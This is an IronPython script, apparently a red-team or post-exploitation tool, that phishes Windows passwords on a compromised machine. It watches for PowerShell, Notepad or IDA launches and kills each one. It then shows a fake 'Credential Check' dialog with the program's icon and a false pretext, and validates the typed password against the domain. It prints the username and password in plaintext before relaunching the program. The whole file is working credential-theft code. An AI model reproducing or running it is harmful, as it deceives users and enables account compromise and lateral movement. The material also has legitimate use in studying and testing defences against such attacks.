##################################################
## IronPython Plaintext Credentials Phishing
##################################################
## Author: daddycocoaman
##################################################
import clr
clr.AddReference("System.Management")
clr.AddReference("System.DirectoryServices.AccountManagement")
clr.AddReference("System.Windows.Forms")
clr.AddReference("System.Drawing")
clr.AddReferenceByName("PresentationFramework, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35")
clr.AddReferenceByName("PresentationCore, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35")

import System.Windows as Windows
import System.Environment as Env
from System.Drawing import Point, Icon, Font, Color, FontStyle
from System.Windows.Forms import Form, Button, FormBorderStyle, FormStartPosition, DockStyle, TextBox, Label, Keys, KeyEventHandler, CloseReason, DialogResult
from System.Windows.Forms import MessageBox, MessageBoxButtons, MessageBoxIcon, MessageBoxDefaultButton, MessageBoxOptions, FormClosingEventHandler
from System import TimeSpan, EventHandler
from System.Diagnostics import Process
from System.DirectoryServices.AccountManagement import PrincipalContext, ContextType
from System.Management import ManagementScope, ManagementObjectSearcher, WqlObjectQuery, ManagementEventWatcher, WqlEventQuery, EventArrivedEventHandler
from System.Threading import Thread

WATCHLIST = ["powershell.exe", "notepad.exe", "ida64.exe"]
GOT_CRED = False

class credPhish():
    def __init__(self, proc):
        self.proc = proc
        self.path = self.proc["TargetInstance"]["ExecutablePath"]
        self.name = self.proc["TargetInstance"]["Name"]
        self.popup()
        
    def SubmitHandler(self, sender, e):
        
        #Check if computer is part of a domain. 
        try:
            clr.AddReference("System.DirectoryServices.ActiveDirectory")
            ctxType = ContextType.Domain 
        except IOError:
            ctxType = ContextType.Machine

        ctx = PrincipalContext(ctxType)
        if ctx.ValidateCredentials(Env.UserName, self.inpBox.Text):
            startWatch.Stop()
            print "[+] CRED SUCCESS: Credentials validated against {0} -- {1}:{2}".format(ctx.ConnectedServer, Env.UserName, self.inpBox.Text)
            self.form.Dispose()
            self.form.Close()

            self.NewProcess = Process()
            self.NewProcess.StartInfo.FileName = self.path
            self.NewProcess.StartInfo.Arguments = self.proc['TargetInstance']['CommandLine'].replace("\"{0}\"".format(self.path), "")
            GOT_CRED = True
        else:
            print "[-] CRED FAIL: Credentials failed against {0} -- {1}:{2}".format(Env.MachineName, Env.UserName, self.inpBox.Text)
            MessageBox.Show("Invalid Credentials!", "", MessageBoxButtons.OK, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly)

    def CancelHandler(self, sender, e):
        if e.CloseReason == CloseReason.UserClosing:
            print "[+] CANCELED: Check canceled by user"

    def CancelButtonHandler(self, sender, e):
        print "[+] CANCELED: Check canceled by user"

    def popup(self):
        self.form = Form()
        self.form.Text = "Credential Check"
        self.form.MaximizeBox = False
        self.form.MinimizeBox = False
        self.form.Width = 300
        self.form.Height = 180
        self.form.Icon = Icon.ExtractAssociatedIcon(self.path) or None
        self.form.StartPosition = FormStartPosition.CenterScreen
        self.form.FormBorderStyle = FormBorderStyle.FixedDialog
        self.form.TopMost = True
        
        self.valButton = Button()
        self.valButton.Text = "OK"
        self.valButton.Location = Point(70, 110)
        self.valButton.Click += EventHandler(self.SubmitHandler)

        self.canButton = Button()
        self.canButton.Text = "Cancel"
        self.canButton.Location = Point(150, 110)
        self.canButton.Click += EventHandler(self.CancelButtonHandler)

        self.tbox = Label()
        self.tbox.Text = "Recent system administrative changes require Windows credentials to access {0}. \nThis security check is only required once.\n\nEnter your Windows password for validation:".format(self.name)
        self.tbox.Location = Point(10, 10)
        self.tbox.Width = 280
        self.tbox.Height = 100
        self.tbox.Font = Font("Arial", 8, FontStyle.Bold)

        self.inpBox = TextBox()
        self.inpBox.AcceptsReturn = True
        self.inpBox.Location  = Point(13, 80)
        self.inpBox.Width = 250
        self.inpBox.UseSystemPasswordChar = True

        self.form.AcceptButton = self.valButton
        self.form.CancelButton = self.canButton
        self.form.Controls.Add(self.valButton)
        self.form.Controls.Add(self.canButton)
        self.form.Controls.Add(self.inpBox)
        self.form.Controls.Add(self.tbox)
        self.form.ActiveControl = self.tbox
        self.form.FormClosing += FormClosingEventHandler(self.CancelHandler)
        self.form.ShowDialog()
        

def ProcEventHandler(sender, e):
    proc = e.NewEvent
    if proc['TargetInstance']['Name'] in WATCHLIST:
        Process.GetProcessById(proc['TargetInstance']['ProcessId']).Kill()
        print "[+] KILL SUCCESS: {0}\t{1}".format(proc['TargetInstance']['ProcessId'], proc['TargetInstance']['CommandLine'])
        cp = credPhish(proc)
        print "[+] PROCESS SPAWNED: {0} {1}".format(cp.path, cp.NewProcess.StartInfo.Arguments)
        cp.NewProcess.Start()
        print "[!] PROCESS EXIT CODE: {0}".format(cp.NewProcess.ExitCode)

def procWatch():
    print "[*] Watching Process Creation for: {0}".format(", ".join(WATCHLIST))
    while GOT_CRED is False:
        try:
            proc = startWatch.WaitForNextEvent()
            if proc['TargetInstance']['Name'] in WATCHLIST:
                Process.GetProcessById(proc['TargetInstance']['ProcessId']).Kill()
                print "[+] KILL SUCCESS: {0}\t{1}".format(proc['TargetInstance']['ProcessId'], proc['TargetInstance']['CommandLine'])
                
                cp = credPhish(proc)
                if hasattr(cp, "NewProcess"):
                    cp.NewProcess.Start()
                    print "[+] PROCESS SPAWNED: {0}\t{1} {2}".format(cp.NewProcess.Id, cp.path, cp.NewProcess.StartInfo.Arguments)
                    #Process.GetCurrentProcess.Kill()
                    Thread.GetCurrentThread().Abort()
        except:
            break
try:
    startWatch = ManagementEventWatcher(WqlEventQuery("__InstanceCreationEvent", TimeSpan(0,0,1), 'TargetInstance isa "Win32_Process"' ))
    procWatch()
except KeyboardInterrupt:
    print "[*] Exiting."